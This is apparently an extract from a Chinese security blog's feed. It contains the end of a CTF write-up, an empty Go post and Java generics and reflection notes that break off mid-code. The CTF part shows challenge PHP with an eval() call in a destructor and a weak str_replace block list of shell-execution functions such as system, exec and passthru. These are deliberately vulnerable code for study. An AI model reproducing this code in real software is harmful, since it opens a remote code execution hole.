class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$sessionManager</span>-&gt;<span class="title function_ invoke__">filterSensitiveFunctions</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;login.php&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionRandom</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sessionPath</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sessionId</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sensitiveFunctions</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;proc_open&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">session_status</span>() == PHP_SESSION_NONE) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Session has not been started. Please start a session before using this class.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionPath = <span class="title function_ invoke__">session_save_path</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sessionId = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getSessionFilePath</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;sessionPath . <span class="string">&quot;/sess_&quot;</span> . <span class="variable language_">$this</span>-&gt;sessionId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterSensitiveFunctions</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sessionFile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSessionFilePath</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sessionFile</span>)) &#123;</span><br><span class="line">            <span class="variable">$sessionData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$sessionFile</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sensitiveFunctions <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$sessionData</span>, <span class="variable">$function</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$sessionData</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$function</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$sessionData</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sessionFile</span>, <span class="variable">$sessionData</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Sensitive functions have been filtered from the session file.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Session file not found.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初见Go</title>
      <link href="/2024/11/05/%E5%88%9D%E8%A7%81Go/"/>
      <url>/2024/11/05/%E5%88%9D%E8%A7%81Go/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> all in one </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全1_类与反射</title>
      <link href="/2024/11/04/Java%E5%AE%89%E5%85%A81_%E7%B1%BB%E4%B8%8E%E5%8F%8D%E5%B0%84/"/>
      <url>/2024/11/04/Java%E5%AE%89%E5%85%A81_%E7%B1%BB%E4%B8%8E%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h2 id="java中的类"><a href="#java中的类" class="headerlink" title="java中的类"></a>java中的类</h2><h3 id="宏观概念"><a href="#宏观概念" class="headerlink" title="宏观概念"></a>宏观概念</h3><ol><li>java中的类是静态的，而php中的类是动态的</li></ol><h3 id="Final关键字"><a href="#Final关键字" class="headerlink" title="Final关键字"></a>Final关键字</h3><blockquote><p>类似于cpp中的const</p></blockquote><ol><li>final 变量：值一旦被赋值就不能再改变。</li><li>final 方法：不能被子类重写。</li><li>final 类：不能被继承。</li><li>final 参数：在方法体内不能被修改。</li><li>final 和匿名内部类：匿名内部类中使用的外部类局部变量必须是 final 或 effectively final</li></ol><h2 id="Java泛型"><a href="#Java泛型" class="headerlink" title="Java泛型"></a>Java泛型</h2><h3 id="简要引入"><a href="#简要引入" class="headerlink" title="简要引入"></a>简要引入</h3><ol><li>java的泛型就类似于cpp中的模板，通过<strong>将类型作为参数</strong>，并通过此参数来定义代码块的类型，实现代码的复用</li><li>Java中的泛型应用于三种东西上：泛型类、泛型接口、泛型方法</li><li><em><strong>java的泛型是伪泛型</strong></em>: Java泛型这个特性是从JDK 1.5才开始加入的，因此为了兼容之前的版本，Java泛型的实现采取了“伪泛型”的策略，即Java在语法上支持泛型，但是在编译阶段会进行所谓的“类型擦除”（Type Erasure），将所有的泛型表示（尖括号中的内容）都替换为具体的类型（其对应的原生态类型），就像完全没有泛型一样 –&gt; 接下来会有部分进行说明</li></ol><h3 id="三种应用"><a href="#三种应用" class="headerlink" title="三种应用"></a>三种应用</h3><h4 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h4><ol><li><code>Notepad&lt;String,Integer&gt; t = null ;</code>在创建时确定一个类的对象的泛型参数</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Notepad</span>&lt;K,V&gt;&#123;       <span class="comment">// 此处指定了两个泛型类型  </span></span><br><span class="line">    <span class="keyword">private</span> K key ;     <span class="comment">// 此变量的类型由外部决定  </span></span><br><span class="line">    <span class="keyword">private</span> V value ;   <span class="comment">// 此变量的类型由外部决定  </span></span><br><span class="line">    <span class="keyword">public</span> K <span class="title function_">getKey</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.key ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> V <span class="title function_">getValue</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.value ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setKey</span><span class="params">(K key)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.key = key ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(V value)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.value = value ;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line">------</span><br><span class="line">著作权归<span class="meta">@pdai</span>所有</span><br><span class="line">原文链接：https:<span class="comment">//pdai.tech/md/java/basic/java-basic-x-generic.html</span></span><br></pre></td></tr></table></figure><h4 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h4><ol><li><p><code>IInfo&lt;String&gt; i = null;</code>和<code>IInfo&lt;String&gt; abc = new Info&lt;String&gt;()</code>在声明泛型对象时确定泛型参数</p></li><li><p><em><strong>Q: 泛型接口的子类一定是泛型类？</strong></em></p><ol><li>A: 并不是</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Processor</span>&lt;T&gt; &#123;</span><br><span class="line">   T <span class="title function_">process</span><span class="params">(T input)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IProcessor</span>&lt;T, U&gt; &#123;</span><br><span class="line">   U <span class="title function_">process</span><span class="params">(T input)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 情况一：子类非泛型类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringProcessor</span> <span class="keyword">implements</span> <span class="title class_">Processor</span>&lt;String&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">process</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> input.toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 情况二：子类是泛型类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringProcessor</span>&lt;T <span class="keyword">extends</span> <span class="title class_">String</span>&gt; <span class="keyword">implements</span> <span class="title class_">Processor</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">process</span><span class="params">(T input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> input.toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 情况三：部分泛型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringToIntProcessor</span>&lt;U&gt; <span class="keyword">implements</span> <span class="title class_">IProcessor</span>&lt;String, U&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> U <span class="title function_">process</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (U.class == Integer.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> (U) Integer.valueOf(input);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unsupported type&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h4 id="泛型函数"><a href="#泛型函数" class="headerlink" title="泛型函数"></a>泛型函数</h4><ol><li>泛型方法需要用<code>&lt;T&gt;</code>前缀来表示这是一个泛型方法</li><li>根据调用时传入的参数确定泛型参数</li><li>实例：<strong>实现一个根据类名获取实例的泛型方法</strong></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">getObject</span><span class="params">(Class&lt;T&gt; c)</span> <span class="keyword">throws</span> InstantationException&#123;</span><br><span class="line">   <span class="type">T</span> <span class="variable">t</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">   <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> getObject(Class.forName(<span class="string">&quot;ReflectionTest.User&quot;</span>));</span><br></pre></td></tr></table></figure><h3 id="泛型的上下边界机制"><a href="#泛型的上下边界机制" class="headerlink" title="泛型的上下边界机制"></a>泛型的上下边界机制</h3><h4 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h4><ol><li>局限1：应用了泛型后，如果进行类型的转换或者不同函数调用时，发现所接受的类型其实是当前泛型参数的父类时，此时直接使用会出错，不太方便</li><li>局限2：同时，如果对于参数的类型有某些要求的话，这里也无法实现会出错</li><li>出于以上两个原因，java引入了泛型的上下界机制对泛型进行拓展</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 局限1的情况</span></span><br><span class="line"><span class="comment">// B extends A</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">funC</span><span class="params">(List&lt;A&gt; listA)</span> &#123;</span><br><span class="line">    <span class="comment">// ...          </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">funD</span><span class="params">(List&lt;B&gt; listB)</span> &#123;</span><br><span class="line">    funC(listB); <span class="comment">// Unresolved compilation problem: The method doPrint(List&lt;A&gt;) in the type test is not applicable for the arguments (List&lt;B&gt;)</span></span><br><span class="line">    <span class="comment">// ...             </span></span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment">// 局限2的情况常常出现在排序函数需要参数可以比较 --&gt; 要求参数类实现Comparable接口</span></span><br></pre></td></tr></table></figure><h4 id="上界"><a href="#上界" class="headerlink" title="上界"></a>上界</h4><ol><li><code>&lt;T extends BoundType&gt;</code>: 指定类型参数必须是某个特定类型或其子类型<ol><li><em><strong>可以使用&amp;连接多个上界</strong></em>: <code>&lt;T extends BoundType1 &amp; BoundType2 &amp; ...&gt;</code></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; T <span class="title function_">findMax</span><span class="params">(List&lt;T&gt; list)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (list == <span class="literal">null</span> || list.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;List must not be null or empty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">T</span> <span class="variable">maxElement</span> <span class="operator">=</span> list.get(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (T element : list) &#123;</span><br><span class="line">        <span class="keyword">if</span> (element.compareTo(maxElement) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            maxElement = element;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxElement;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="下界"><a href="#下界" class="headerlink" title="下界"></a>下界</h4><ol><li><code>&lt;T super BoundType&gt;</code>: 指定类型参数必须是某个特定类型或其父类型</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只要是Number机器父类都可以成为泛型</span></span><br><span class="line"><span class="keyword">public</span> &lt;T <span class="built_in">super</span> Number&gt; <span class="keyword">void</span> <span class="title function_">addNumbers</span><span class="params">(List&lt;T&gt; list, Number... numbers)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (Number number : numbers) &#123;</span><br><span class="line">        list.add((T) number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="综合应用与最佳实践"><a href="#综合应用与最佳实践" class="headerlink" title="综合应用与最佳实践"></a>综合应用与最佳实践</h4><ol><li><p>实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>  &lt;E <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;? <span class="built_in">super</span> E&gt;&gt; E <span class="title function_">max</span><span class="params">(List&lt;? extends E&gt; e1)</span> &#123;</span><br><span class="line">   <span class="comment">// E必须实现比较器</span></span><br><span class="line">   <span class="comment">// 比较器必须支持E及它的父类</span></span><br><span class="line">    <span class="keyword">if</span> (e1 == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//迭代器返回的元素属于 E 的某个子类型</span></span><br><span class="line">    Iterator&lt;? <span class="keyword">extends</span> <span class="title class_">E</span>&gt; iterator = e1.iterator();</span><br><span class="line">    <span class="type">E</span> <span class="variable">result</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">next</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">        <span class="keyword">if</span> (next.compareTo(result) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            result = next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用原则《Effictive Java》</p><ol><li>为了获得最大限度的灵活性，要在表示 生产者或者消费者 的输入参数上使用通配符，使用的规则就是：生产者有上限、消费者有下限</li><li>如果参数化类型表示一个 T 的生产者，使用 &lt; ? extends T&gt;;</li><li>如果它表示一个 T 的消费者，就使用 &lt; ? super T&gt;；</li><li>如果既是生产又是消费，那使用通配符就没什么意义了，因为你需要的是精确的参数类型。</li></ol></li></ol><h3 id="Q-A"><a href="#Q-A" class="headerlink" title="*Q&amp;A &lt;T&gt;"></a>*Q&amp;A &lt;T&gt;</h3><h4 id="1-Class和Class"><a href="#1-Class和Class" class="headerlink" title="1. Class和Class&lt;?&gt;"></a>1. Class和Class&lt;?&gt;</h4><h4 id="2-ArrayList和List"><a href="#2-ArrayList和List" class="headerlink" title="2. ArrayList&lt;Integer&gt;和List&lt;Number&gt;"></a>2. ArrayList&lt;Integer&gt;和List&lt;Number&gt;</h4><ol><li><p>补充一点泛型接口和泛型类的关系</p></li><li><p>不能把ArrayList&lt;Integer&gt;向上转型为ArrayList&lt;Number&gt;或List&lt;Number&gt; –&gt; <em><strong><code>ArrayList&lt;Integer&gt;</code>和<code>ArrayList&lt;Number&gt;</code>两者完全没有继承关系</strong></em>，但是就是T不变时，可以向上转型，T本身不能向上转型</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果可以，产生矛盾</span></span><br><span class="line"><span class="comment">// 编译器为了避免这种错误，根本不允许把ArrayList&lt;Integer&gt;转型为ArrayList&lt;Number&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建ArrayList&lt;Integer&gt;类型：</span></span><br><span class="line">ArrayList&lt;Integer&gt; integerList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line"><span class="comment">// 添加一个Integer：</span></span><br><span class="line">integerList.add(<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">123</span>));</span><br><span class="line"><span class="comment">// “向上转型”为ArrayList&lt;Number&gt;：</span></span><br><span class="line">ArrayList&lt;Number&gt; numberList = integerList;</span><br><span class="line"><span class="comment">// 添加一个Float，因为Float也是Number：</span></span><br><span class="line">numberList.add(<span class="keyword">new</span> <span class="title class_">Float</span>(<span class="number">12.34</span>));</span><br><span class="line"><span class="comment">// 从ArrayList&lt;Integer&gt;获取索引为1的元素（即添加的Float）：</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> integerList.get(<span class="number">1</span>); <span class="comment">// ClassCastException!</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="反射引入"><a href="#反射引入" class="headerlink" title="反射引入"></a>反射引入</h3><blockquote><p>Java反射机制是Java动态性中最为重要的体现，利用反射机制我们可以轻松的实现Java类的动态调用。Java的大部分框架都是采用了反射机制来实现的(如:Spring MVC、ORM框架等)，Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用</p></blockquote><ol><li>主要作用<ol><li>获取<strong>类的信息</strong>：<ol><li>获取类的名称、父类、实现的接口等。</li><li>获取类的字段、方法和构造函数。</li></ol></li><li>创建对象：<ol><li>通过类名创建对象。</li><li>调用带有不同参数的构造函数。</li></ol></li><li>访问字段与方法<ol><li>读取和设置字段的值，包括私有字段。</li><li>调用对象的方法，包括私有方法。</li></ol></li><li>创建和操作数组：<ol><li>创建数组对象，获取数组的长度，读取和设置数组元素。</li></ol></li></ol></li></ol><h3 id="利用反射进行操作"><a href="#利用反射进行操作" class="headerlink" title="*利用反射进行操作"></a>*利用反射进行操作</h3><h4 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h4><ol><li><p>一般有3中方式</p><ol><li><em><strong>补充内部类</strong></em>: 反射调用内部类的时候需要使用<code>$</code>来代替.,如com.anbai.Test类有一个叫做Hello的内部类，那么调用的时候就应该将类名写成：<code>com.anbai.Test$Hello</code></li><li><em><strong>类加载器方式不进行初始化</strong></em>: 通过类加载器获取 Class 对象不会进行初始化，意味着不进行包括初始化等一系列步骤，<strong>静态代码块和静态对象不会得到执行</strong></li><li>异常处理是<code>ClassNotFoundException</code></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 1. 知道具体类：字面量路径</span></span><br><span class="line"> &#123;ClassName&#125;.class</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 2. 已知类名：字符串类型路径(必须完整)</span></span><br><span class="line"> Class.forName(<span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 3. 类加载器获取: 